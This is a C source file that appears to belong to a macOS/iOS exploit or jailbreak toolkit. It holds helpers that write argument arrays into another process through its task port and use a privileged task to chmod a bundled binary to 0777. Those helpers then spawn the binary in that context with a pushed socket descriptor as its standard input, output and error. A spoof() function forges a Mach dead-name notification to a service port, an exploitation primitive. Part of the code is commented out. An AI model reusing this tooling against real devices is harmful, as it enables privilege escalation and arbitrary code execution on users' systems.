#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>

#include <mach/mach.h>

#include <spawn.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>

#include <CoreFoundation/CoreFoundation.h>

#include "drop_payload.h"
#include "remote_file.h"
#include "remote_call.h"
#include "remote_memory.h"
#include "remote_ports.h"
#include "task_ports.h"

static char* bundle_path() {
  CFBundleRef mainBundle = CFBundleGetMainBundle();
  CFURLRef resourcesURL = CFBundleCopyResourcesDirectoryURL(mainBundle);
  int len = 4096;
  char* path = malloc(len);
  
  CFURLGetFileSystemRepresentation(resourcesURL, TRUE, (UInt8*)path, len);
  
  return path;
}


// takes a char** argv,envp array and copies it to a remote process
uint64_t build_remote_exec_string_array(mach_port_t task_port, char** args) {
  int n_ptrs = 0;
  for (int i = 0;;i++) {
    n_ptrs++;
    if (args[i] == NULL) {
      break;
    }
  }
  // build the argv:
  uint64_t remote_args = remote_alloc(task_port, 8*n_ptrs);
  if (remote_args == 0) {
    printf("remote alloc failed\n");
    return 0;
  }
  
  for (int i = 0; i < n_ptrs-1; i++) {
    char* local_arg_string = args[i];
    size_t local_arg_string_length = strlen(local_arg_string) + 1;
    uint64_t remote_arg_string = remote_alloc(task_port, local_arg_string_length);
    remote_write(task_port, remote_arg_string, (uint64_t)local_arg_string, local_arg_string_length);
    
    remote_write(task_port, remote_args + (i*8), (uint64_t)&remote_arg_string, 8);
  }
  
  uint64_t nullptr = 0;

  remote_write(task_port, remote_args+(8*(n_ptrs-1)), (uint64_t)&nullptr, sizeof(nullptr));
  
  return remote_args;
}

mach_port_t cached_spawn_context_port = MACH_PORT_NULL;

void cache_spawn_context_port(mach_port_t spawn_context_port) {
  cached_spawn_context_port = spawn_context_port;
}

char* spawn_binary_and_capture_output(mach_port_t spawn_context_task_port,
                                      char* full_binary_path,
                                      char** argv,
                                      char** envp,
                                      size_t* output_size) {
//  uint64_t remote_argv = build_remote_exec_string_array(spawn_context_task_port, argv);
//  uint64_t remote_envp = build_remote_exec_string_array(spawn_context_task_port, envp);
//
//  // allocate a pipe:
//  int pipefd[2]; //{read, write}
//  int pipe_err = pipe(pipefd);
//  if (pipe_err != 0) {
//    printf("failed to allocate pipe\n");
//    return 0;
//  }
//
//  printf("pipefd[0]: %d\npipefd[1]: %d\n", pipefd[0], pipefd[1]);
//
//  // send the write end of the pipe to the spawn context:
//  int remote_pipe_fd = push_local_fd(spawn_context_task_port, pipefd[1]);
//  if (remote_pipe_fd < 0) {
//    printf("failed to push pipe to target process\n");
//    return NULL;
//  }
//
//  close(pipefd[1]);
//  int readfd = pipefd[0];
//
//  posix_spawn_file_actions_t actions; // (void*)
//
//  //posix_spawn_file_actions_init(&actions);
//  int action_err = (int) call_remote(spawn_context_task_port, posix_spawn_file_actions_init, 1,
//                                     REMOTE_OUT_BUFFER(&actions, sizeof(actions)));
//
//  if (action_err != 0) {
//    printf("remote posix_spawn_file_actions_init failed: %x\n", action_err);
//    return NULL;
//  }
//
//  action_err = (int) call_remote(spawn_context_task_port, posix_spawn_file_actions_adddup2, 3,
//                                 REMOTE_BUFFER(&actions, sizeof(actions)),
//                                 REMOTE_LITERAL(remote_pipe_fd),
//                                 REMOTE_LITERAL(1));
//  if (action_err != 0) {
//    printf("remote posix_spawn_file_actions_adddup2 failed: %x\n", action_err);
//    return NULL;
//  }
//
//  pid_t spawned_pid = 0;
//
//
//  int spawn_err = (int) call_remote(spawn_context_task_port, posix_spawn, 6,
//                                    REMOTE_OUT_BUFFER(&spawned_pid, sizeof(spawned_pid)),
//                                    REMOTE_CSTRING(full_binary_path),
//                                    REMOTE_BUFFER(&actions, sizeof(actions)), //REMOTE_LITERAL(0), // file actions
//                                    REMOTE_LITERAL(0),
//                                    REMOTE_LITERAL(remote_argv),
//                                    REMOTE_LITERAL(remote_envp));
//
//  if (spawn_err != 0){
//    printf("shell spawn error: %x", spawn_err);
//    //return NULL;
//  }
//  printf("posix_spawn success!\n");
//
//  // close the fd in the spawn context:
//  call_remote(spawn_context_task_port, close, 1,
//              REMOTE_LITERAL(remote_pipe_fd));
//  printf("closed the pipe in the spawn context, target should have the only write end\n");
//
//  // read until EOF:
//  size_t size = 0;
//  char* output_buffer = NULL;
//
//  char buf[BUFSIZ];
//  ssize_t rlen = 0;
//  while(1) {
//    printf("about to read from %d\n", readfd);
//    rlen = read(readfd, buf, BUFSIZ);
//    printf("read returned %zx\n", rlen);
//    if (rlen == 0) {
//      break;
//    }
//    if (rlen < 0) {
//      printf("read failed (but not EOF)\n");
//      break;
//    }
//    output_buffer = realloc(output_buffer, size+rlen);
//    memcpy(output_buffer+size, buf, rlen);
//    size += rlen;
//  }
//
//  close(readfd);
//
//  printf("about to waitpid\n");
//  int wl = 0;
//  int waitpid_ret = (int) call_remote(cached_privileged_port, waitpid, 3,
//                                      REMOTE_LITERAL(spawned_pid),
//                                      REMOTE_OUT_BUFFER(&wl, sizeof(wl)),
//                                      REMOTE_LITERAL(0));
//
//  printf("waitpid returned: %d (wl: %d)\n", waitpid_ret, wl);
//
//  *output_size = size;
  return NULL;
}


pid_t spawn_binary(mach_port_t spawn_context_task_port,
                   char* full_binary_path,
                   char** argv,
                   char** envp) {
  uint64_t remote_argv = build_remote_exec_string_array(spawn_context_task_port, argv);
  uint64_t remote_envp = build_remote_exec_string_array(spawn_context_task_port, envp);
  
  // send the connected socket to the target process:
  int remote_stdio_fd = push_local_fd(spawn_context_task_port, 1);
  if (remote_stdio_fd < 0) {
    printf("failed to push local connected socket port to target process\n");
    return -1;
  }
  
  posix_spawn_file_actions_t actions; // (void*)
  
  //posix_spawn_file_actions_init(&actions);
  int action_err = (int) call_remote(spawn_context_task_port, posix_spawn_file_actions_init, 1,
                                     REMOTE_OUT_BUFFER(&actions, sizeof(actions)));
  
  if (action_err != 0) {
    printf("remote posix_spawn_file_actions_init failed: %x\n", action_err);
    return -1;
  }
  
  for (int fd = 0; fd < 3; fd++) {
    //posix_spawn_file_actions_adddup2(&actions, conn, 0);
    action_err = (int) call_remote(spawn_context_task_port, posix_spawn_file_actions_adddup2, 3,
                                   REMOTE_BUFFER(&actions, sizeof(actions)),
                                   REMOTE_LITERAL(remote_stdio_fd),
                                   REMOTE_LITERAL(fd));
    if (action_err != 0) {
      printf("remote posix_spawn_file_actions_adddup2 failed: %x\n", action_err);
      return -1;
    }
  }
  
  pid_t spawned_pid = 0;
  
  int spawn_err = (int) call_remote(spawn_context_task_port, posix_spawn, 6,
                                    REMOTE_OUT_BUFFER(&spawned_pid, sizeof(spawned_pid)),
                                    REMOTE_CSTRING(full_binary_path),
                                    REMOTE_BUFFER(&actions, sizeof(actions)), //REMOTE_LITERAL(0), // file actions
                                    REMOTE_LITERAL(0),
                                    REMOTE_LITERAL(remote_argv),
                                    REMOTE_LITERAL(remote_envp));
  
  if (spawn_err != 0){
    printf("shell spawn error: %x", spawn_err);
    return -1;
  }
  printf("posix_spawn success!\n");
  
  return spawned_pid;
}

// doesn't set stdin/out etc
pid_t spawn_bundle_binary(mach_port_t privileged_task_port,
                          mach_port_t spawn_context_task_port,
                          char* binary, // path to the target from the root of the app bundle
                          char** argv,
                          char** envp) {
  // chmod the binary from the context of the privileged task:
  char* full_binary_path = NULL;
  char* bundle_root = bundle_path();
  asprintf(&full_binary_path, "%s/%s", bundle_root, binary);
  
  printf("preparing %s\n", full_binary_path);
  
  // make it executable:
  int chmod_err = (int) call_remote(privileged_task_port, chmod, 2,
                                    REMOTE_CSTRING(full_binary_path),
                                    REMOTE_LITERAL(0777));

  if (chmod_err != 0){
    printf("chmod failed\n");
    return -1;
  }
  printf("chmod success\n");
  
  pid_t pid = spawn_binary(spawn_context_task_port, full_binary_path, argv, envp);
  free(bundle_root);
  free(full_binary_path);
  return pid;
}

#if 0
// doesn't set stdin/out etc
void spawn_bundle_binary_and_capture_output(mach_port_t privileged_task_port,
                                            mach_port_t spawn_context_task_port,
                                            char* binary,                         // path to the target from the root of the app bundle
                                            char** argv,
                                            char** envp) {
  // chmod the binary from the context of the privileged task:
  char* full_binary_path = NULL;
  char* bundle_root = bundle_path();
  asprintf(&full_binary_path, "%s/%s", bundle_root, binary);
  
  printf("preparing %s\n", full_binary_path);
  
  // make it executable:
  int chmod_err = (int) call_remote(privileged_task_port, chmod, 2,
                                    REMOTE_CSTRING(full_binary_path),
                                    REMOTE_LITERAL(0777));
  
  if (chmod_err != 0){
    printf("chmod failed\n");
    return -1;
  }
  printf("chmod success\n");
  
  pid_t pid = spawn_binary_and_capture_output(spawn_context_task_port, full_binary_path, argv, envp);
  free(bundle_root);
  free(full_binary_path);
  return pid;
}
#endif


// servers.h prototypes:
extern kern_return_t
bootstrap_look_up(mach_port_t  bootstrap_port,
                  char*        service_name,
                  mach_port_t* service_port);

extern kern_return_t
bootstrap_register(mach_port_t bootstrap_port,
                   char*       service_name,
                   mach_port_t service_port);


// lookup a launchd service:
mach_port_t lookup(char* name) {
    mach_port_t service_port = MACH_PORT_NULL;
    kern_return_t err = bootstrap_look_up(bootstrap_port, name, &service_port);
    if(err != KERN_SUCCESS){
        printf("unable to look up %s\n", name);
        return MACH_PORT_NULL;
    }
    
    if (service_port == MACH_PORT_NULL) {
        printf("bad service port\n");
        return MACH_PORT_NULL;
    }
    return service_port;
}

struct notification_msg {
    mach_msg_header_t   not_header;
    NDR_record_t        NDR;
    mach_port_name_t not_port;
};

// -framework IOKit to get this
kern_return_t
io_ps_copy_powersources_info(mach_port_t,
                             int,
                             vm_address_t*,
                             mach_msg_type_number_t *,
                             int*);

void spoof(mach_port_t port, uint32_t name) {
    kern_return_t err;
    struct notification_msg not = {0};
    
    not.not_header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    not.not_header.msgh_size = sizeof(struct notification_msg);
    not.not_header.msgh_remote_port = port;
    not.not_header.msgh_local_port = MACH_PORT_NULL;
    not.not_header.msgh_id = 0110; // MACH_NOTIFY_DEAD_NAME
    
    not.NDR = NDR_record;
    
    not.not_port = name;
    
    // send the fake notification message
    err = mach_msg(&not.not_header,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   (mach_msg_size_t)sizeof(struct notification_msg),
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
}

